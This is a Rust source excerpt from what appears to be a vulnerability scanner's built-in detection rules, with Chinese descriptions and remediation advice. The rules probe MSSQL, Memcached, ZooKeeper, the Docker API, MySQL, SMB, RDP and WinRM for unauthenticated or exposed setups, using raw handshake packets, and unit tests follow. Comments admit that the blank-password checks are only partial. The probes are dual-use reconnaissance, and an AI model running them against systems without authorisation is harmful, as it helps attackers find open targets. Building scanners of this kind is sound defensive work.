            category: "未授权".to_string(),
            description: "MSSQL SA 账户使用空密码，可完全控制数据库".to_string(),
            tags: vec!["mssql".to_string(), "sql-server".to_string()],
            remediation: "设置 SA 强密码，禁用 SA 账户或使用 Windows 认证".to_string(),
        },
        transport: Transport::Tcp,
        default_port: Some(1433),
        rules: vec![PoCRequest {
            method: String::new(),
            path: String::new(),
            headers: HashMap::new(),
            body: None,
            data: Some(mssql_prelogin_packet()),
            read_size: Some(4096),
            matchers_condition: "and".to_string(),
            // NOTE: 当前仅发送 Pre-Login 包，无法真正验证 SA 空密码。
            // 完整修复需要: 发送 TDS Login7 包 (SA + 空密码)，
            // 然后检查响应中的 LOGINACK token (0xAD) 表示登录成功。
            // 目前收紧为匹配 TDS 响应头 (type=0x04 Tabular Result + status=0x01 EOM)，
            // 至少确认目标是有效的 TDS 服务而非任意 TCP 响应。
            matchers: vec![Matcher {
                matcher_type: MatcherType::Binary,
                part: String::new(),
                words: vec![],
                regex: vec![],
                status: vec![],
                // TDS response: type 0x04 (Tabular Result) + status 0x01 (EOM)
                binary: vec!["0401".to_string()],
                negative: false,
            }],
            extractors: vec![],
        }],
        script: None,
    }
}

/// MSSQL TDS Pre-Login packet (简化版)
fn mssql_prelogin_packet() -> String {
    let packet: Vec<u8> = vec![
        0x12, 0x01, 0x00, 0x2F, // TDS header: Pre-Login, status, length
        0x00, 0x00, 0x01, 0x00, // SPID, PacketID, Window
        0x00, // Option
        // Pre-login options
        0x00, 0x00, 0x15, 0x00, 0x06, // Version option
        0x01, 0x00, 0x1B, 0x00, 0x01, // Encryption option
        0x02, 0x00, 0x1C, 0x00, 0x01, // Instance option
        0x03, 0x00, 0x1D, 0x00, 0x00, // ThreadID option
        0x04, 0x00, 0x1D, 0x00, 0x01, // Mars option
        // Data
        0x0C, 0x00, 0x10, 0x04, 0x00, 0x00, // Version: 12.0.4096.0
        0x00, // Encryption: not supported
        0x00, // Instance: default
        0x01, // Mars: enabled
    ];
    String::from_utf8_lossy(&packet).to_string()
}

fn memcached_unauth() -> PoCRule {
    PoCRule {
        id: "memcached-unauth".to_string(),
        info: PoCInfo {
            name: "Memcached 未授权访问".to_string(),
            severity: Severity::High,
            category: "未授权".to_string(),
            description: "Memcached 无认证，可直接读取/写入缓存数据".to_string(),
            tags: vec!["memcached".to_string()],
            remediation: "启用 SASL 认证，绑定监听地址为 127.0.0.1".to_string(),
        },
        transport: Transport::Tcp,
        default_port: Some(11211),
        rules: vec![PoCRequest {
            method: String::new(),
            path: String::new(),
            headers: HashMap::new(),
            body: None,
            data: Some("stats\r\n".to_string()),
            read_size: Some(8192),
            matchers_condition: "and".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Word,
                part: String::new(),
                words: vec!["STAT".to_string(), "version".to_string()],
                regex: vec![],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
            extractors: vec![],
        }],
        script: None,
    }
}

fn zookeeper_unauth() -> PoCRule {
    PoCRule {
        id: "zookeeper-unauth".to_string(),
        info: PoCInfo {
            name: "ZooKeeper 未授权访问".to_string(),
            severity: Severity::High,
            category: "未授权".to_string(),
            description: "ZooKeeper 四字命令未授权访问".to_string(),
            tags: vec!["zookeeper".to_string()],
            remediation: "配置 ZooKeeper ACL 认证".to_string(),
        },
        transport: Transport::Tcp,
        default_port: Some(2181),
        rules: vec![PoCRequest {
            method: String::new(),
            path: String::new(),
            headers: HashMap::new(),
            body: None,
            data: Some("ruok\r\n".to_string()),
            read_size: Some(1024),
            matchers_condition: "and".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Word,
                part: String::new(),
                words: vec!["imok".to_string()],
                regex: vec![],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
            extractors: vec![],
        }],
        script: None,
    }
}

fn docker_api_unauth() -> PoCRule {
    PoCRule {
        id: "docker-api-unauth".to_string(),
        info: PoCInfo {
            name: "Docker API 未授权访问".to_string(),
            severity: Severity::Critical,
            category: "未授权".to_string(),
            description: "Docker Remote API 暴露，可创建特权容器获取宿主机权限".to_string(),
            tags: vec!["docker".to_string()],
            remediation: "禁止 Docker API 外部访问，启用 TLS 认证".to_string(),
        },
        transport: Transport::Http,
        default_port: Some(2375),
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/version".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Word,
                    part: "body".to_string(),
                    words: vec!["ApiVersion".to_string(), "MinAPIVersion".to_string()],
                    regex: vec![],
                    status: vec![],
                    binary: vec![],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Status,
                    part: "status_code".to_string(),
                    words: vec![],
                    regex: vec![],
                    status: vec![200],
                    binary: vec![],
                    negative: false,
                },
            ],
            extractors: vec![],
        }],
        script: None,
    }
}

fn mysql_blank_root() -> PoCRule {
    PoCRule {
        id: "mysql-blank-root".to_string(),
        info: PoCInfo {
            name: "MySQL Root 空密码检测".to_string(),
            severity: Severity::Critical,
            category: "未授权".to_string(),
            description: "MySQL root 账户空密码，可完全控制数据库".to_string(),
            tags: vec!["mysql".to_string()],
            remediation: "设置 root 强密码，删除空密码账户".to_string(),
        },
        transport: Transport::Tcp,
        default_port: Some(3306),
        rules: vec![PoCRequest {
            method: String::new(),
            path: String::new(),
            headers: HashMap::new(),
            body: None,
            data: Some(mysql_greeting_check()),
            read_size: Some(4096),
            matchers_condition: "and".to_string(),
            // NOTE: 当前仅接收 MySQL Greeting，未发送认证包，无法验证 root 空密码。
            // 完整修复需要: 解析 Greeting 中的 salt，构造 HandshakeResponse41
            // (root + 空密码)，发送后检查 OK packet (首字节 0x00) 确认认证成功。
            // 目前收紧为匹配 MySQL 认证插件名 (仅出现在 MySQL Greeting 中)，
            // 避免将任意包含 "mysql" 字符串的 banner 误报为漏洞。
            matchers: vec![Matcher {
                matcher_type: MatcherType::Word,
                part: String::new(),
                words: vec![
                    "mysql_native_password".to_string(),
                    "caching_sha2_password".to_string(),
                ],
                regex: vec![],
                status: vec![],
                binary: vec![],
                negative: false,
            }],
            extractors: vec![],
        }],
        script: None,
    }
}

/// MySQL Greeting 检测 (发送空 payload，等待服务端 Handshake)
/// TODO: 完整实现应解析 Greeting 并发送 HandshakeResponse41 进行空密码认证
fn mysql_greeting_check() -> String {
    // MySQL 协议: 服务端先发送 greeting，客户端只需连接即可
    // 这里我们发送一个空 payload 等待服务端 greeting
    String::new()
}

fn smb_signing_disabled() -> PoCRule {
    PoCRule {
        id: "smb-signing-disabled".to_string(),
        info: PoCInfo {
            name: "SMB 签名未启用".to_string(),
            severity: Severity::Medium,
            category: "配置检测".to_string(),
            description: "SMB 签名未启用，存在中间人攻击风险".to_string(),
            tags: vec!["smb".to_string(), "mitm".to_string()],
            remediation: "启用 SMB 签名: 要求所有 SMB 连接进行签名".to_string(),
        },
        transport: Transport::Tcp,
        default_port: Some(445),
        rules: vec![PoCRequest {
            method: String::new(),
            path: String::new(),
            headers: HashMap::new(),
            body: None,
            data: Some(smb_negotiate_packet()),
            read_size: Some(4096),
            matchers_condition: "and".to_string(),
            // NOTE: 仅检查 Negotiate 响应存在无法判断签名是否启用。
            // 完整修复需要: 解析 SMB1 Negotiate 响应中 SecurityMode 字段
            // (SMB 头偏移 36 字节处)，检查 bit 2 (SECURITY_SIGNATURES_REQUIRED)
            // 和 bit 3 (SECURITY_SIGNATURES_ENABLED)。若 bit 2 = 0 则签名非必需。
            // 对 SMB2/3 (0xFE 'SMB')，需解析 Negotiate 响应 SecurityMode 字段
            // (偏移 70)，值 0x0002 表示要求签名。
            // 目前收紧为匹配 SMB1 Negotiate 响应，减少非 SMB 服务的误报。
            matchers: vec![Matcher {
                matcher_type: MatcherType::Binary,
                part: String::new(),
                words: vec![],
                regex: vec![],
                status: vec![],
                // \xffSMB + Command 0x72 (Negotiate) = SMB1 Negotiate 响应
                binary: vec!["ff534d4272".to_string()],
                negative: false,
            }],
            extractors: vec![],
        }],
        script: None,
    }
}

fn rdp_open() -> PoCRule {
    PoCRule {
        id: "rdp-open".to_string(),
        info: PoCInfo {
            name: "RDP 服务检测 (信息)".to_string(),
            severity: Severity::Info,
            category: "服务检测".to_string(),
            description: "检测到 RDP 远程桌面服务开放 (仅信息收集，非漏洞)。可关注是否启用 NLA。"
                .to_string(),
            tags: vec!["rdp".to_string(), "info".to_string()],
            remediation: "如非必要可关闭 RDP，否则限制访问来源并启用网络级别认证(NLA)".to_string(),
        },
        transport: Transport::Tcp,
        default_port: Some(3389),
        rules: vec![PoCRequest {
            method: String::new(),
            path: String::new(),
            headers: HashMap::new(),
            body: None,
            data: Some(rdp_negotiation_packet()),
            read_size: Some(1024),
            matchers_condition: "and".to_string(),
            // 匹配 TPKT 头 (0x03 0x00) + X.224 Connection Confirm (0xD0)，
            // 确认目标是 RDP/X.224 服务而非任意开放端口。
            matchers: vec![
                Matcher {
                    matcher_type: MatcherType::Binary,
                    part: String::new(),
                    words: vec![],
                    regex: vec![],
                    status: vec![],
                    // TPKT header: version 3, reserved 0
                    binary: vec!["0300".to_string()],
                    negative: false,
                },
                Matcher {
                    matcher_type: MatcherType::Binary,
                    part: String::new(),
                    words: vec![],
                    regex: vec![],
                    status: vec![],
                    // X.224 Connection Confirm PDU type (0xD0)
                    binary: vec!["d0".to_string()],
                    negative: false,
                },
            ],
            extractors: vec![],
        }],
        script: None,
    }
}

/// RDP X.224 Connection Request (简化版)
fn rdp_negotiation_packet() -> String {
    let packet: Vec<u8> = vec![
        0x03, 0x00, 0x00, 0x13, // TPKT header: version, reserved, length
        0x0E, // X.224 length indicator
        0xD0, // X.224 type: Connection Request
        0x00, 0x00, 0x12, 0x40, // Destination reference
        0x00, 0x00, 0x00, 0x01, // Source reference
        0x00, // Class option
        // RDP Negotiation Request
        0x01, 0x00, // Type: RDP negotiation request
        0x08, 0x00, // Length: 8
        0x01, 0x00, 0x00, 0x00, // Requested protocols: SSL
    ];
    String::from_utf8_lossy(&packet).to_string()
}

fn winrm_open() -> PoCRule {
    PoCRule {
        id: "winrm-open".to_string(),
        info: PoCInfo {
            name: "WinRM 开放检测".to_string(),
            severity: Severity::Medium,
            category: "服务检测".to_string(),
            description: "WinRM 远程管理服务开放，可能被用于远程执行命令".to_string(),
            tags: vec!["winrm".to_string()],
            remediation: "限制 WinRM 访问来源，启用 HTTPS".to_string(),
        },
        transport: Transport::Http,
        default_port: Some(5985),
        rules: vec![PoCRequest {
            method: "GET".to_string(),
            path: "/wsman".to_string(),
            headers: HashMap::new(),
            body: None,
            data: None,
            read_size: None,
            matchers_condition: "and".to_string(),
            matchers: vec![Matcher {
                matcher_type: MatcherType::Status,
                part: "status_code".to_string(),
                words: vec![],
                regex: vec![],
                status: vec![200, 401, 405], // 任何响应都说明 WinRM 在运行
                binary: vec![],
                negative: false,
            }],
            extractors: vec![],
        }],
        script: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_builtin_pocs_loaded() {
        let pocs = get_builtin_pocs();
        assert!(
            pocs.len() >= 28,
            "Expected at least 28 built-in PoCs, got {}",
            pocs.len()
        );
    }

    #[test]
    fn test_all_pocs_have_valid_ids() {
        let pocs = get_builtin_pocs();
        let mut ids = std::collections::HashSet::new();
        for poc in &pocs {
            assert!(!poc.id.is_empty(), "PoC has empty id");
            assert!(ids.insert(&poc.id), "Duplicate PoC id: {}", poc.id);
        }
    }

    #[test]
    fn test_all_pocs_have_matchers() {
        let pocs = get_builtin_pocs();
        for poc in &pocs {
            for rule in &poc.rules {
                assert!(
                    !rule.matchers.is_empty(),
                    "PoC {} has rule without matchers",
                    poc.id
                );
            }
        }
    }

    #[test]
    fn test_filter_by_severity() {
        let critical = filter_builtin_pocs(Some(Severity::Critical), None);
        assert!(critical
            .iter()
            .all(|p| p.info.severity == Severity::Critical));

        let high = filter_builtin_pocs(Some(Severity::High), None);
        assert!(high.iter().all(|p| p.info.severity == Severity::High));
    }

    #[test]
    fn test_filter_by_category() {
        let deserialization = filter_builtin_pocs(None, Some("反序列化"));
        assert!(deserialization
            .iter()
            .all(|p| p.info.category.contains("反序列化") || p.info.name.contains("反序列化")));

        let unauth = filter_builtin_pocs(None, Some("未授权"));
        assert!(unauth
            .iter()
            .all(|p| p.info.category.contains("未授权") || p.info.name.contains("未授权")));
    }

    #[test]
    fn test_shiro_poc_structure() {
        let pocs = get_builtin_pocs();
        let shiro = pocs.iter().find(|p| p.id == "shiro-550-detect").unwrap();
        assert_eq!(shiro.transport, Transport::Http);
        assert_eq!(shiro.info.severity, Severity::High);
        assert_eq!(shiro.rules[0].method, "GET");
        assert!(shiro.rules[0].headers.contains_key("Cookie"));
    }

    #[test]
    fn test_redis_poc_structure() {
        let pocs = get_builtin_pocs();
        let redis = pocs.iter().find(|p| p.id == "redis-unauth").unwrap();
        assert_eq!(redis.transport, Transport::Tcp);
        assert_eq!(redis.default_port, Some(6379));
        assert!(redis.rules[0].data.is_some());
    }
}
